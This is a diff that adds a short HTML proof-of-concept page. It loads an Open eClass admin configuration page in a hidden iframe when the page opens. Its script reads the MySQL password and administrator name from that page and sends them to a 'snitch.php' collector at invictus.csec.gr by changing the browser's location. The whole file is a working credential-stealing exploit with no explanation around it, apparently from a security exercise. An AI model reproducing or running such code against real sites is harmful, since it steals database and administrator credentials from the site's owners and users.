@@ -1,0 +1,13 @@
+<html>
+	<body>
+		<script type="text/javascript">
+		function doIt() {
+			//var x = document.getElementsByName('formmysqlPassword')[0].value;
+			var pass = document.getElementById("idframe").contentWindow.document.getElementsByName("formmysqlPassword")[0].value;
+			var user = document.getElementById("idframe").contentWindow.document.getElementsByName("formadministratorName")[0].value;
+			window.location = "http://invictus.csec.gr/snitch.php?user="+user+"&pass="+pass+"&url=http://invictus.csec.gr/";
+		}
+		</script>
+		<iframe id="idframe" src="http://invictus.csec.gr/modules/admin/eclassconf.php" style="display:none;" onload="doIt()"></iframe>
+	</body>
+</html>
